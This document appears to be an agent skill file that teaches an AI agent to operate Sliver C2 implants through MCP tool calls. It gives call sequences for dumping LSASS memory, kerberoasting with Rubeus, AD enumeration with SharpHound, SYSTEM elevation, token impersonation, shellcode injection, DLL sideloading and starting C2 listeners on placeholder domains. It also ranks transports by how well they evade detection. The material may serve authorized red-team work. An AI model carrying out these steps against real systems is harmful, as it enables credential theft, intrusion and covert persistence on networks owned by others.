---
name: sliver-c2
description: Use when operating Sliver C2 implants, managing listeners, or performing post-exploitation via sessions or beacons.
---

# Sliver C2 Post-Exploitation

## Sessions vs Beacons

- **Sessions**: Real-time interactive. Use for active enumeration. Higher detection risk.
- **Beacons**: Async callback with interval + jitter. Use for persistence. Lower detection risk.

Our MCP handles both transparently — `interact(implant_id, implant_type="beacon")` resolves async tasks automatically. Beacons check in on a set interval with jitter and queue tasks between check-ins; sessions hold a live, interactive connection. See Sliver's [Beacons vs. Sessions](https://sliver.sh/docs?name=Beacons+vs.+Sessions) docs.

## Orientation (do this first)

```
connect()                                                        # or connect(config_file="...")
get_sessions()                                                   # list live sessions
get_beacons()                                                    # list beacons
interact(implant_id="abc-123", implant_type="session")           # set active target
whoami()                                                         # confirm user context
pwd() / ls()                                                     # confirm position
ps()                                                             # survey processes
ifconfig() / netstat()                                           # map network
```

Always `connect()` first, then `interact()` to set the active target before running implant commands.

## Credential Access

**Dump LSASS** (requires SYSTEM or SeDebugPrivilege):
```
get_system()                                       # elevate first
process_dump(pid=<lsass_pid>)                      # dump memory
```
Find LSASS PID with `ps()`, then use offline tools (mimikatz, pypykatz) on the dump.

**In-memory .NET tooling** via execute_assembly:
```
execute_assembly(assembly_path="/local/Rubeus.exe", arguments="kerberoast /format:hashcat")
execute_assembly(assembly_path="/local/SharpHound.exe", arguments="-c All -d domain.local")
```

**BOFs** — Beacon Object Files are small compiled COFF programs that run inside the implant process without spawning a new one. Install via Sliver's armory, execute via Sliver CLI. See Sliver's [BOF and COFF Support](https://sliver.sh/docs?name=BOF+and+COFF+Support) docs.

## Lateral Movement

**Token manipulation flow**:
1. `make_token(username="admin", password="pass", domain="DOMAIN")` — create token
2. Do lateral work (file access, registry, etc.)
3. `revert_to_self()` — drop the token

**Other options**: `impersonate(username)`, `run_as(username, process_name, args)`, `get_system()`.

**Pivoting/Tunneling** — not available via our MCP tools, use Sliver CLI:
- TCP/named pipe pivots — chain an implant through another implant to reach hosts with no direct route to the C2 server. See Sliver's [Pivots](https://sliver.sh/docs?name=Pivots) docs.
- Port forwarding — forward a local or remote port across the implant link to reach an internal service. See Sliver's [Port Forwarding](https://sliver.sh/docs?name=Port+Forwarding) docs.
- SOCKS proxy — open a reverse SOCKS5 proxy through the implant so local tools can reach the target network. See Sliver's [Reverse SOCKS](https://sliver.sh/docs?name=Reverse+SOCKS) docs.

## Execution

| Method | Notes |
|--------|-------|
| `execute(exe, args)` | Run binary directly, no shell |
| `execute_assembly(path, args)` | In-memory .NET (Rubeus, Seatbelt, etc.) |
| `execute_shellcode(path, pid=)` | Inject raw shellcode, pid=0 for self |
| `sideload(dll_path, entry_point=)` | Load shared library into sacrificial process |

## C2 Transport Selection

Pick the transport when you **generate the implant** — the callback endpoint (host, port, domain) is embedded in the implant at build time. `start_*_listener` only starts the matching server-side receiver (see Listener Management below); it does not set the implant's endpoint. Per-protocol setup: [mTLS C2](https://sliver.sh/docs?name=mTLS+C2), [HTTPS C2](https://sliver.sh/docs?name=HTTPS+C2), [DNS C2](https://sliver.sh/docs?name=DNS+C2), [WireGuard C2](https://sliver.sh/docs?name=WireGuard+C2), and [C2 Advanced Options](https://sliver.sh/docs?name=C2+Advanced+Options).

| Transport | Speed | Stealth | Notes |
|-----------|-------|---------|-------|
| mTLS | Fast | Moderate | Encrypted + authenticated, unusual traffic |
| HTTPS | Fast | High | Blends with web, supports domain fronting |
| DNS | Slow | Very high | Tunnels through DNS, extremely evasive |
| WireGuard | Fast | Moderate | VPN-based, good for persistent access |

## Listener Management

```
start_mtls_listener(host="0.0.0.0", port=8888)
start_https_listener(host="0.0.0.0", port=443, domain="cdn.example.com")
start_dns_listener(domains=["c2.example.com"], port=53)
get_jobs()                                         # list active listeners
kill_job(job_id=1)                                 # stop a listener
```

## Implant Management

```
get_implant_builds()                               # list stored builds
regenerate_implant(implant_name="windows-mtls")    # regenerate binary
kill_session(session_id="abc-123")                 # terminate session
kill_beacon(beacon_id="def-456")                   # terminate beacon
```

## Sliver Native MCP

Sliver v1.6+ ships a built-in MCP server (see Sliver's [MCP](https://sliver.sh/docs?name=MCP) docs). Upstream marks it experimental: not all commands are exposed yet, and authentication over HTTP/SSE isn't supported. Where it does expose a command our wrapper doesn't cover (pivots, SOCKS, port forwarding, armory, implant generation), prefer it; otherwise use the Sliver CLI.
